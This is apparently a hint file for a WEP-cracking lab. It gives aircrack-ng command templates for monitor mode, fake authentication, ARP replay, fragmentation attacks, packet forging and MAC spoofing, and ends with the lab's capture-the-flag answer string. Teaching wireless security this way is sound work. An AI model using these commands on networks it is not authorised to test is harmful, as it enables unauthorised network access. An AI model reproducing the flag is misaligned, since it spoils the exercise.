# Lab 04: WEP Cracking - Hints

Progressive hints to help you complete the lab without giving away the full solution.

```
+===============================================================+
|                        HINT GUIDE                              |
+===============================================================+
|  Start with Hint Level 1. Only proceed if still stuck.        |
|  Challenge yourself - learning happens through struggle!       |
+===============================================================+
```

## Legal Reminder

```
+=====================================================================+
|                         LEGAL WARNING                                |
+=====================================================================+
|  Only attack networks you OWN or have EXPLICIT WRITTEN PERMISSION   |
|  to test. Unauthorized access to wireless networks is a crime.      |
+=====================================================================+
```

---

## Exercise 1: Basic WEP Crack

### Task
Perform a complete WEP cracking attack on your test network.

### Hint Level 1 - Conceptual Overview
WEP cracking requires four main phases:
1. Put adapter in monitor mode
2. Capture traffic containing IVs (Initialization Vectors)
3. Generate more IVs if needed
4. Use collected IVs to calculate the key

### Hint Level 2 - Tools Needed
The aircrack-ng suite provides everything you need:
- `airmon-ng` - Monitor mode management
- `airodump-ng` - Packet capture
- `aireplay-ng` - Packet injection/replay
- `aircrack-ng` - Key cracking

### Hint Level 3 - Attack Sequence

```
1. airmon-ng   → Enable monitor mode
2. airodump-ng → Find and capture from WEP network
3. aireplay-ng → Associate and replay traffic
4. aircrack-ng → Crack with collected IVs
```

### Hint Level 4 - Terminal Setup
You'll need multiple terminals:
- Terminal 1: Running capture (airodump-ng)
- Terminal 2: Fake authentication (aireplay-ng -1)
- Terminal 3: ARP replay (aireplay-ng -3)
- Terminal 4: Cracking (aircrack-ng)

### Hint Level 5 - Command Templates

```bash
# Enable monitor mode
sudo airmon-ng _____ wlan0

# Capture from specific network
sudo airodump-ng -c [CH] --bssid [AP_MAC] -w [FILE] wlan0mon

# Fake authentication
sudo aireplay-ng -1 0 -e [SSID] -a [AP_MAC] -h [YOUR_MAC] wlan0mon

# ARP replay
sudo aireplay-ng -3 -b [AP_MAC] -h [YOUR_MAC] wlan0mon

# Crack
sudo aircrack-ng [FILE]-01.cap
```

---

## Fake Authentication Hints

### If Authentication Fails

**Hint Level 1:** Authentication may fail for several reasons - MAC filtering, timing issues, or driver problems.

**Hint Level 2:** Try adding a delay between associations:
```bash
sudo aireplay-ng -1 6000 ...
```

**Hint Level 3:** Some APs need slower authentication:
```bash
sudo aireplay-ng -1 0 -o 1 -q 10 ...
# -o 1  : One auth packet at a time
# -q 10 : Keep-alive every 10 seconds
```

**Hint Level 4:** If MAC filtering is enabled, spoof a connected client's MAC:
```bash
sudo ip link set wlan0mon down
sudo ip link set wlan0mon address [CLIENT_MAC]
sudo ip link set wlan0mon up
```

---

## ARP Replay Hints

### "Got 0 ARP requests"

**Hint Level 1:** No ARP traffic means no clients are generating network traffic.

**Hint Level 2:** You need a connected client to do something on the network - browse, ping, etc.

**Hint Level 3:** If you control the test client, run:
```bash
# On test client
ping 192.168.1.1
```

**Hint Level 4:** If no traffic available, use fragmentation or chop-chop attack instead.

---

## Exercise 2: Low Traffic Environment

### Task
Crack WEP when there's no active client traffic.

### Hint Level 1 - Alternative Attacks
When ARP replay fails, you need to create traffic artificially using the keystream you obtain.

### Hint Level 2 - Fragmentation vs Chop-Chop
- Fragmentation (-5): Faster, needs small packets
- Chop-Chop (-4): Works on more networks, slower

### Hint Level 3 - Fragmentation Process
```
1. Capture any data packet
2. Use it to obtain keystream
3. Create a fake ARP packet
4. Inject the fake packet
5. AP responds, generating IVs
```

### Hint Level 4 - Commands Sequence

```bash
# Fragmentation attack
sudo aireplay-ng -5 -b [AP] -h [YOUR_MAC] wlan0mon

# When keystream obtained, forge ARP
sudo packetforge-ng -0 -a [AP] -h [YOUR_MAC] -k 255.255.255.255 -l 255.255.255.255 -y [XOR_FILE] -w arp-packet

# Inject forged packet
sudo aireplay-ng -2 -r arp-packet wlan0mon
```

---

## Exercise 3: Key Complexity Analysis

### Task
Compare cracking 64-bit vs 128-bit WEP.

### Hint Level 1 - What to Measure
- Number of IVs needed to crack
- Time taken to collect those IVs
- Time taken for aircrack-ng to find the key

### Hint Level 2 - Expected Results
64-bit WEP doesn't take half the time of 128-bit. Why?

### Hint Level 3 - Understanding the Result
The IV is always 24 bits regardless of key length. The weakness is in IV reuse, not key length.

### Hint Level 4 - Key Insight
```
64-bit WEP:  40-bit key + 24-bit IV
128-bit WEP: 104-bit key + 24-bit IV

Both have the same IV weakness!
The attack doesn't brute force the key - it uses statistical analysis of IVs.
```

---

## Cracking Hints

### "Cracking Failed" or "Not enough IVs"

**Hint Level 1:** aircrack-ng needs sufficient IVs to statistically determine the key.

**Hint Level 2:** Minimum IVs needed:
- PTW attack: ~40,000 IVs
- Traditional: ~150,000 IVs

**Hint Level 3:** Check your capture file:
```bash
aircrack-ng -b [AP_MAC] capture-01.cap
# Shows: got XXXXX IVs
```

**Hint Level 4:** Keep the ARP replay running until you have enough IVs. Watch the #Data column in airodump-ng.

### "100% Decrypted but Wrong Key"

**Hint Level 1:** Very rare - usually means interference or capture issues.

**Hint Level 2:** Try capturing fresh traffic and start over.

**Hint Level 3:** Verify the captured packets are actually from your target AP.

---

## IV Count Reference

```
IVs Needed for Reliable Crack:

 IVs          Success Rate
──────────────────────────────
 20,000       ~50%
 30,000       ~75%
 40,000       ~90%
 60,000       ~99%
100,000       ~100%

Monitor the #Data column in airodump-ng
```

---

## Common Error Messages

### "Invalid WEP key"

**Cause:** The captured traffic isn't WEP encrypted
**Solution:** Verify the network encryption type with airodump-ng

### "AP MAC could not be found"

**Cause:** AP not broadcasting on expected channel
**Solution:** Re-scan and verify correct BSSID and channel

### "Got a deauthentication packet!"

**Cause:** AP or another attacker is sending deauth
**Solution:** Re-authenticate and continue

---

## Quick Reference Card

```bash
# Monitor Mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Find WEP networks
sudo airodump-ng --encrypt WEP wlan0mon

# Target network
sudo airodump-ng -c [CH] --bssid [AP] -w capture wlan0mon

# Authenticate
sudo aireplay-ng -1 0 -a [AP] -h [MAC] wlan0mon

# Generate traffic
sudo aireplay-ng -3 -b [AP] -h [MAC] wlan0mon

# Crack
sudo aircrack-ng capture-01.cap

# If no traffic - Fragmentation
sudo aireplay-ng -5 -b [AP] -h [MAC] wlan0mon
```

---

## Still Stuck?

1. **Verify hardware compatibility:** Does your adapter support injection?
   ```bash
   sudo aireplay-ng --test wlan0mon
   ```

2. **Check basics:** Correct channel? Correct BSSID?

3. **Review previous labs:** Monitor mode working? Reconnaissance complete?

4. **Consult walkthrough:** walkthrough.md has complete solutions

---

**Flag Location:** Successfully crack the WEP key to find: `FLAG{w3p_1s_d34d}`
